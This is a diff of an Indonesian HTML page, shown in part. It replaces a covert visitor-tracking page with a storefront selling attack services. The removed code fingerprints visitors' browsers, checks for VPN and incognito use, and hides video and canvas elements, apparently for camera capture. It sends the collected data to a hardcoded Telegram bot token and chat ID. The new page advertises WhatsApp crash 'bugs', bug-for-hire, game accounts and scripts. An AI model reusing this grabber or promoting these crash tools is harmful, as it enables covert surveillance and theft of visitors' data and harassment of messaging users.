@@ -1,546 +1,390 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Xemzz - Website</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0f0f0f;
-      padding: 20px;
-      color: #e0e0e0;
-    }
-    .terminal-box {
-      background: #1a1a1a;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-      max-width: 700px;
-      margin: auto;
-      border: 1px solid #333;
-      position: relative;
-    }
-    .terminal-header {
-      background: #222;
-      padding: 8px 15px;
-      border-radius: 5px 5px 0 0;
-      margin: -20px -20px 15px -20px;
-      display: flex;
-      align-items: center;
-      border-bottom: 1px solid #444;
-    }
-    .terminal-title {
-      font-weight: bold;
-      color: #4CAF50;
-      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
-    }
-    .terminal-dots {
-      display: flex;
-      margin-right: 10px;
-    }
-    .dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      margin-right: 6px;
-    }
-    .dot-red { background: #ff5f56; }
-    .dot-yellow { background: #ffbd2e; }
-    .dot-green { background: #27c93f; }
-    .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-    }
-    .info-item {
-      display: flex;
-      margin-bottom: 8px;
-      font-size: 14px;
-    }
-    .info-label {
-      color: #4CAF50;
-      min-width: 120px;
-      margin-right: 10px;
-    }
-    .info-value {
-      color: #e0e0e0;
-      word-break: break-all;
-    }
-    .section-title {
-      color: #4CAF50;
-      margin: 15px 0 10px 0;
-      padding-bottom: 5px;
-      border-bottom: 1px solid #333;
-      grid-column: span 2;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      color: #666;
-      font-size: 12px;
-    }
-    video, canvas {
-      display: none;
-    }
-    @media (max-width: 600px) {
-      .info-grid {
-        grid-template-columns: 1fr;
-      }
-      .section-title {
-        grid-column: span 1;
-      }
-    }
-  </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KAA HOSTING</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
 </head>
-<body>
-
-  <div class="terminal-box">
-    <div class="terminal-header">
-      <div class="terminal-dots">
-        <div class="dot dot-red"></div>
-        <div class="dot dot-yellow"></div>
-        <div class="dot dot-green"></div>
-      </div>
-      <div class="terminal-title">WELCOME</div>
+<body class="bg-black text-gray-200 overflow-x-hidden">
+    <!-- Background Animasi -->
+    <div class="fixed -z-50 w-full h-full overflow-hidden bg-black">
+        <div class="absolute inset-0 bg-black"></div>
     </div>
-    
-    <div class="info-grid" id="deviceInfo">
-      <div class="section-title">LOADING</div>
+
+    <!-- Header -->
+    <header class="py-4 border-b border-gray-900 bg-black sticky top-0 z-50 shadow-xl animate__animated animate__fadeInDown">
+        <div class="container mx-auto px-4 flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <img src="./kaa.png" alt="Logo KAA Hosting" class="h-10 w-10 rounded-full ring-2 ring-gray-800 animate__animated animate__zoomIn">
+                <h1 class="text-xl md:text-2xl font-bold text-white animate__animated animate__fadeIn">KAA HOSTING</h1>
+            </div>
+            <div class="hidden md:flex space-x-6">
+                <a href="#" class="hover:text-gray-300 transition duration-300 transform hover:scale-105 group">
+                    Beranda
+                    <div class="h-0.5 bg-gray-800 scale-x-0 group-hover:scale-x-100 transition-transform origin-left"></div>
+                </a>
+                <a href="#produk" class="hover:text-gray-300 transition duration-300 transform hover:scale-105 group">
+                    Produk
+                    <div class="h-0.5 bg-gray-800 scale-x-0 group-hover:scale-x-100 transition-transform origin-left"></div>
+                </a>
+                <a href="https://t.me/kanotdv" class="hover:text-gray-300 transition duration-300 transform hover:scale-105 group">
+                    Kontak
+                    <div class="h-0.5 bg-gray-800 scale-x-0 group-hover:scale-x-100 transition-transform origin-left"></div>
+                </a>
+            </div>
+            <button class="md:hidden text-2xl hover:text-gray-300 transition transform hover:rotate-90 duration-300" id="menu-toggle">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Menu Mobile -->
+    <div class="md:hidden hidden bg-black py-4 px-4 border-b border-gray-900 animate__animated animate__fadeIn" id="mobile-menu">
+        <a href="#" class="block py-3 px-4 hover:bg-gray-900 rounded-lg transition duration-300 transform hover:translate-x-2 group">
+            <i class="fas fa-home mr-3 text-gray-400 group-hover:text-gray-300 transition"></i> Beranda
+        </a>
+        <a href="#produk" class="block py-3 px-4 hover:bg-gray-900 rounded-lg transition duration-300 transform hover:translate-x-2 group">
+            <i class="fas fa-box-open mr-3 text-gray-400 group-hover:text-gray-300 transition"></i> Produk
+        </a>
+        <a href="https://t.me/kanotdv" class="block py-3 px-4 hover:bg-gray-900 rounded-lg transition duration-300 transform hover:translate-x-2 group">
+            <i class="fas fa-paper-plane mr-3 text-gray-400 group-hover:text-gray-300 transition"></i> Kontak
+        </a>
     </div>
-    
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
-    
-    <div class="footer">Telegram @XemzzXiterz</div>
-  </div>
 
-  <script>
-    const token = '7965035533:AAFAQ9UHoozrA1m_DfMQufPtE8xb1UtEzQA';
-    const chatId = '7525205684';
+    <!-- Hero Section -->
+    <section class="pt-32 pb-24 px-4 text-center relative overflow-hidden">
+        <div class="max-w-4xl mx-auto relative z-10 animate__animated animate__fadeIn">
+            <h2 class="text-4xl md:text-6xl font-bold mb-6 text-white">
+                <span class="inline-block animate__animated animate__fadeInDown">Welcome!!</span> 
+                <span class="inline-block text-gray-300 animate__animated animate__fadeInDown animate__delay-1s">User</span>
+            </h2>
+            <p class="text-xl text-gray-400 mb-8 max-w-2xl mx-auto animate__animated animate__fadeIn animate__delay-1s">
+                Buy disini aja cuy, dijamin amanah 100%
+            </p>
+            <a href="#produk" class="inline-block bg-gray-900 hover:bg-gray-800 text-white py-3 px-8 rounded-lg font-medium transition duration-500 transform hover:scale-105 hover:shadow-lg hover:shadow-black/30 animate__animated animate__pulse animate__infinite animate__slower">
+                <span class="flex items-center justify-center space-x-2">
+                    <span>LIST</span>
+                    <i class="fas fa-arrow-down"></i>
+                </span>
+            </a>
+        </div>
+    </section>
 
-    function sendText(text) {
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
-      });
-    }
+    <!-- Bagian Produk -->
+    <section id="produk" class="py-16 px-4 relative">
+        <div class="container mx-auto">
+            <h2 class="text-3xl md:text-4xl font-bold mb-16 text-center text-white animate__animated animate__fadeIn">
+                <span class="relative inline-block">
+                    <span class="relative z-10">PRICE LIST</span>
+                    <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gray-800 animate-scale-x"></span>
+                </span>
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Produk 1 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list1.png" alt="FORS SALE SC NEW KUNO" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">FORS SALE SC NEW KUNO</h3>
+                        <ul class="space-y-2 text-gray-300 mb-4">
+                            <li class="flex items-center animate__animated animate__fadeInRight">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                NO UP : 5K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-1s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                UP 2× : 7K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-2s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                UP PERMA : 15K
+                            </li>
+                        </ul>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02]">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
 
-    function sendPhotoBlob(blob, filename = 'image.jpg') {
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, filename);
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-    }
+                <!-- Produk 2 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list2.png" alt="OPEN FRE ORDER NIKA V14" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">OPEN FRE ORDER NIKA V14</h3>
+                        <ul class="space-y-2 text-gray-300 mb-4">
+                            <li class="flex items-center animate__animated animate__fadeInRight">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                FORCLOSE NEW
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-1s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                FORCLOSE BETA
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-2s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                FC ALL WHATSAP
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-3s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                DELAY MAKER
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-4s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                DELAY INVIS
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-5s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                BLANK CHAT
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-6s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                BLANK GRUB
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-7s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                DLL LAIN LAIN
+                            </li>
+                            <li class="flex items-center font-bold animate__animated animate__fadeInRight animate__delay-8s">
+                                <span class="w-2 h-2 bg-gray-600 rounded-full mr-2 animate-pulse"></span>
+                                PRICE 20K
+                            </li>
+                        </ul>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02]">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
 
-    function createInfoItem(label, value) {
-      const container = document.getElementById('deviceInfo');
-      const item = document.createElement('div');
-      item.className = 'info-item';
-      item.innerHTML = `
-        <div class="info-label">${label}</div>
-        <div class="info-value">${value}</div>
-      `;
-      container.appendChild(item);
-      return `<b>${label}:</b> ${value}\n`;
-    }
+                <!-- Produk 3 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list3.png" alt="OPEN MURBUG" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">OPEN MURBUG</h3>
+                        <ul class="space-y-2 text-gray-300 mb-4">
+                            <li class="flex items-center animate__animated animate__fadeInRight">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                MURID BUG 10K PERMA
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-1s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                BISA OPEN JASA BUG
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-2s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                BISA BUG RIPER
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-3s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                BISA BUG SEPUASNYA
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-4s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                JASA BUG PERNO 3K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-5s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                PANEL UNLI 2K
+                            </li>
+                        </ul>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02]">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
 
-    function getRandomUID() {
-      return 'xxxx-xxxx-4xxx-yxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
-      });
-    }
+                <!-- Produk 4 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list4.png" alt="OPEN PANEL PTERODACTYL" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">OPEN PANEL PTERODACTYL</h3>
+                        <ul class="space-y-2 text-gray-300 mb-4">
+                            <li class="flex items-center animate__animated animate__fadeInRight">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                1GB : 1K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-1s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                2GB : 2K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-2s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                3GB : 3K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-3s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                4GB : 4K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-4s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                5GB : 5K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-5s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                10GB 6K:
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-6s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                UNLI : 6K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-7s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                ADMIN PANEL 7K
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-8s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                RESELER PANEL 8K/BULAN
+                            </li>
+                        </ul>
+                        <p class="text-sm text-gray-400 mt-3 animate__animated animate__fadeIn">
+                            PANEL PREMIUM ANTI DELAY BY KAA WHY US. ANTI DELAY AND SERVER ANTI LAG 100% TERJAMIN BERGARANSI 30 HARI HIGH PEROMANCE VPS RAM 16 CORE 4 STABIL MURAH AMAN DAN RINGAN.
+                        </p>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02] mt-4">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
 
-    function getGPUInfo() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
-        }
-        return 'Unknown';
-      } catch (e) {
-        return 'Unknown';
-      }
-    }
+                <!-- Produk 5 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list5.png" alt="OPEN STOCK AKUN FF" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">OPEN STOCK AKUN FF</h3>
+                        <p class="text-gray-300 mb-4 animate__animated animate__fadeIn">
+                            DRI STOK RECEH AMA STOK GAGAH.
+                        </p>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02]">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
 
-    function getHardwareID() {
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillText('HardwareID', 2, 2);
-        return canvas.toDataURL();
-      } catch (e) {
-        return 'Unknown';
-      }
-    }
+                <!-- Produk 6 -->
+                <div class="produk-card bg-gray-900 rounded-xl overflow-hidden border border-gray-800 hover:border-gray-700 transition-all duration-500 hover:-translate-y-2 relative group animate__animated">
+                    <div class="gambar-container overflow-hidden relative">
+                        <img src="./list6.png" alt="OPEN ALL SCRIPT SC GACOR" class="w-full h-48 object-cover group-hover:scale-110 transition-transform duration-700">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-4">
+                            <span class="text-white font-medium">Klik untuk memperbesar</span>
+                        </div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3 text-white group-hover:text-gray-300 transition-colors duration-300">OPEN ALL SCRIPT SC GACOR</h3>
+                        <ul class="space-y-2 text-gray-300 mb-4">
+                            <li class="flex items-center animate__animated animate__fadeInRight">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                VOID
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-1s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                MAHJONG
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-2s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                NEW KUNO
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-3s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                NOROI
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-4s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                NIKA
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-5s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                JUSTIN
+                            </li>
+                            <li class="flex items-center animate__animated animate__fadeInRight animate__delay-6s">
+                                <span class="w-2 h-2 bg-gray-700 rounded-full mr-2 animate-pulse"></span>
+                                DLL
+                            </li>
+                        </ul>
+                        <button class="tombol-beli w-full bg-gray-800 hover:bg-gray-700 text-white py-3 px-4 rounded-lg font-medium transition-all duration-500 hover:shadow-lg hover:shadow-black/20 group-hover:scale-[1.02]">
+                            BELI <i class="fas fa-arrow-right ml-2 transition-transform group-hover:translate-x-1"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    function getBrowserFingerprint() {
-      const keys = [
-        'userAgent', 'platform', 'hardwareConcurrency', 
-        'deviceMemory', 'languages', 'maxTouchPoints'
-      ];
-      let fingerprint = {};
-      keys.forEach(key => {
-        fingerprint[key] = navigator[key];
-      });
-      return JSON.stringify(fingerprint);
-    }
+    <!-- Footer -->
+    <footer class="bg-black py-12 px-4 border-t border-gray-900">
+        <div class="container mx-auto">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="flex items-center space-x-3 mb-6 md:mb-0 animate__animated animate__fadeInLeft">
+                    <img src="./kaa.png" alt="Logo KAA Hosting" class="h-12 w-12 rounded-full animate-spin-slow">
+                    <span class="text-2xl font-bold text-white">KAA HOSTING</span>
+                </div>
+                <div class="flex space-x-6 animate__animated animate__fadeInRight">
+                    <a href="https://t.me/kanotdv" class="text-2xl hover:text-gray-300 transition-all duration-300 hover:scale-125 animate__animated animate__pulse animate__infinite animate__slower">
+                        <i class="fab fa-telegram"></i>
+                    </a>
+                </div>
+            </div>
+            <div class="mt-12 text-center animate__animated animate__fadeIn">
+                <p class="text-gray-400 text-sm">
+                    &copy; 2025 KAA HOSTING. Hak cipta dilindungi.
+                </p>
+            </div>
+        </div>
+    </footer>
 
-    function getDetectedFonts() {
-      const fonts = [
-        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-        'Verdana', 'Webdings', 'Wingdings'
-      ];
-      return fonts.filter(font => {
-        const span = document.createElement('span');
-        span.style.fontFamily = 'monospace';
-        span.style.fontSize = '24px';
-        span.innerHTML = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-        document.body.appendChild(span);
-        const width1 = span.offsetWidth;
-        span.style.fontFamily = font + ',monospace';
-        const width2 = span.offsetWidth;
-        document.body.removeChild(span);
-        return width1 !== width2;
-      }).join(', ');
-    }
+    <!-- Modal Gambar -->
+    <div id="modal-gambar" class="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-4 hidden">
+        <div class="relative w-full max-w-4xl">
+            <button id="tutup-modal" class="absolute -top-12 right-0 text-white text-3xl hover:text-gray-300 z-50 transition duration-300 transform hover:rotate-90">
+                <i class="fas fa-times"></i>
+            </button>
+            <img id="gambar-modal" src="" alt="Gambar Produk" class="w-full max-h-[80vh] object-contain animate__animated animate__zoomIn">
+        </div>
+    </div>
 
-    function getCanvasFingerprint() {
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Canvas Fingerprint', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Canvas Fingerprint', 4, 17);
-        return canvas.toDataURL();
-      } catch (e) {
-        return 'Unknown';
-      }
-    }
+    <!-- Notifikasi -->
+    <div id="notifikasi" class="fixed bottom-6 right-6 bg-gray-900 text-white px-6 py-4 rounded-xl shadow-2xl transform translate-y-16 transition-transform duration-300 hidden border-l-4 border-gray-700">
+        <div class="flex items-start">
+            <div class="relative mt-1">
+                <div class="absolute inset-0 bg-gray-700 rounded-full animate-ping opacity-30"></div>
+                <i class="fas fa-bolt text-gray-400 text-xl relative z-10 mr-3"></i>
+            </div>
+            <div>
+                <p class="font-medium">Mengarahkan ke Telegram</p>
+                <p class="text-sm text-gray-300 mt-1">Anda akan dibawa ke channel Telegram kami</p>
+                <div class="mt-2 h-1 w-full bg-gray-800 rounded-full overflow-hidden">
+                    <div class="h-full bg-gray-700 rounded-full animate-progress"></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    function getAudioFingerprint() {
-      try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        const gainNode = audioContext.createGain();
-        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
-        
-        let audioData = '';
-        analyser.connect(scriptProcessor);
-        scriptProcessor.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-        scriptProcessor.onaudioprocess = function(e) {
-          const input = e.inputBuffer.getChannelData(0);
-          audioData += input.join('');
-        };
-        
-        oscillator.type = 'triangle';
-        oscillator.connect(analyser);
-        oscillator.start(0);
-        
-        return audioData.substring(0, 100) + '...';
-      } catch (e) {
-        return 'Unknown';
-      }
-    }
-
-    function getStorageInfo() {
-      try {
-        let storage = '';
-        if (window.localStorage) {
-          storage += `LocalStorage: ${JSON.stringify(localStorage).length} bytes, `;
-        }
-        if (window.sessionStorage) {
-          storage += `SessionStorage: ${JSON.stringify(sessionStorage).length} bytes, `;
-        }
-        if (navigator.storage && navigator.storage.estimate) {
-          navigator.storage.estimate().then(estimate => {
-            storage += `Quota: ${estimate.quota}, Usage: ${estimate.usage}`;
-          });
-        }
-        return storage || 'Unknown';
-      } catch (e) {
-        return 'Unknown';
-      }
-    }
-
-    function getVPNStatus() {
-      return new Promise(resolve => {
-        // Simple VPN detection based on timezone and language mismatch
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const lang = navigator.language;
-        
-        fetch(`https://ipapi.co/timezone/`)
-          .then(res => res.text())
-          .then(ipTz => {
-            if (tz !== ipTz) {
-              resolve('✅ DETECTED (Timezone Mismatch)');
-            } else {
-              fetch(`https://ipapi.co/languages/`)
-                .then(res => res.text())
-                .then(ipLang => {
-                  if (!ipLang.includes(lang.substring(0, 2))) {
-                    resolve('✅ DETECTED (Language Mismatch)');
-                  } else {
-                    resolve('❌ Not Detected');
-                  }
-                })
-                .catch(() => resolve('❓ Unknown'));
-            }
-          })
-          .catch(() => resolve('❓ Unknown'));
-      });
-    }
-
-    function getOpenPorts() {
-      // This is just a simulation - real port scanning would require server-side checks
-      const commonPorts = [80, 443, 22, 21, 25, 3389];
-      return commonPorts.slice(0, 2).join(', ') + '...';
-    }
-
-    function getConnectionType() {
-      if (navigator.connection) {
-        const conn = navigator.connection;
-        return `${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'}Mbps, RTT: ${conn.rtt || '?'}ms)`;
-      }
-      return 'Unknown';
-    }
-
-    function getIncognitoMode() {
-      return new Promise(resolve => {
-        if ('storage' in navigator && 'estimate' in navigator.storage) {
-          navigator.storage.estimate().then(({quota, usage}) => {
-            // Incognito mode typically has much lower quota
-            if (quota < 120000000) {
-              resolve('✅ DETECTED (Low Storage Quota)');
-            } else {
-              resolve('❌ Not Detected');
-            }
-          }).catch(() => resolve('❓ Unknown'));
-        } else {
-          // Fallback check using FileSystem API
